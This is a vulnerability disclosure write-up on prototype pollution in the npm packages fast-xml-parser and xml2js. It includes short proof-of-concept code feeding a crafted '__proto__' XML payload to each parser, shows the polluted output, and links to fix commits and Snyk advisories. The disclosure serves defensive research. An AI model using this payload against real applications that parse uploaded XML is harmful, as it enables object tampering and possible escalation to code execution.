# fast-xml-parser

I was auditing another application and found that they were using 
`fast-xml-parser` parse uploaded xml files.

The package description says *Validate XML, Parse XML to JS Object, or Build XML from JS Object without C/C++ based libraries and no callback.*

*Parse XML to JS Object* - this sounded very interesting and I knew I should test for prototype pollution as many other packages which *convert json to js objects* were found to be vulnerable in the past and it turned out yeah this package was vulnerable to it.

https://www.npmjs.com/package/fast-xml-parser

![image](https://user-images.githubusercontent.com/31372554/232062163-c4a4494c-429e-416b-ab41-3e3bc38aef6a.png)


https://github.com/NaturalIntelligence/fast-xml-parser

Taking an example code from the github repo to demonstrate the bug:


```js
const { XMLParser, XMLBuilder, XMLValidator} = require("fast-xml-parser");


let XMLdata = "<__proto__><polluted>hacked</polluted></__proto__>"

const parser = new XMLParser();
let jObj = parser.parse(XMLdata);


console.log(jObj.polluted) // should return hacked
```

![Code_G3UvvJcSv5](https://user-images.githubusercontent.com/31372554/218308540-86792929-3631-4580-8373-4651487418b5.png)

In the above screenshot you can see the `jObj` was polluted with a new property.

```js
jObj
>{}
jObj.__proto__
>{polluted: 'hacked'}
jObj.__proto__.polluted
>'hacked'
```

More information on prototype pollution can be found here: https://learn.snyk.io/lessons/prototype-pollution/javascript/

As it is common for developers to pass user controllable input to `XMLParser` , this can to do unexpected results. By chaining it with some prototype pollution gadget it might even can lead to RCE in some cases https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/


Fix commit: https://github.com/NaturalIntelligence/fast-xml-parser/commit/2b032a4f799c63d83991e4f992f1c68e4dd05804

They are now validating, if the key contains `__proto__` and replaces it with `#__proto__`

CVE is still pending 

The package maintainer @amitguptagwl was very swift in replies and addressing the reported issue :)


SNYK Advisory: https://security.snyk.io/vuln/SNYK-JS-FASTXMLPARSER-3325616

----------------------------

# xml2js

This package was also found to be vulnerable to the exact same vuln prototype pollution  (fast-xml-parser).
This one offers the same features like we have in fast-xml-parser, converting xml to js object.

https://www.npmjs.com/package/xml2js

![image](https://user-images.githubusercontent.com/31372554/232061839-ea220cb5-8ba8-4fbc-89ea-6f97c7267437.png)


Here are the details, the vulnerability is prototype pollution.

Taking an example code from the github repo to demonstrate the bug:



```js
var parseString = require('xml2js').parseString;
var xml = "<__proto__><polluted>hacked</polluted></__proto__>"
parseString(xml, function (err, result) {
    console.dir(result);
});
```




In the attached screenshot you can see the `result` object was polluted with a new property.

```js
result
>{}
result.__proto__
>{polluted: 'hacked'}
result.__proto__.polluted
>'hacked'
```

More information on prototype pollution can be found here: https://learn.snyk.io/lessons/prototype-pollution/javascript/



It was really hard to get in contact with the maintainer,so I took help of Snyk Vulnerability Disclosure (https://snyk.io/vulnerability-disclosure/). I forwarded them the details in the end of Feb 2023 and recived more information on 10 Apr

![image](https://user-images.githubusercontent.com/31372554/232063590-87222517-f0ce-4864-af0e-b91baf9044ee.png)

So it seems this was already reported by some other researcher way back in 2020 : https://security.snyk.io/vuln/SNYK-JS-XML2JS-5414874

https://github.com/Leonidas-from-XIV/node-xml2js/issues/593

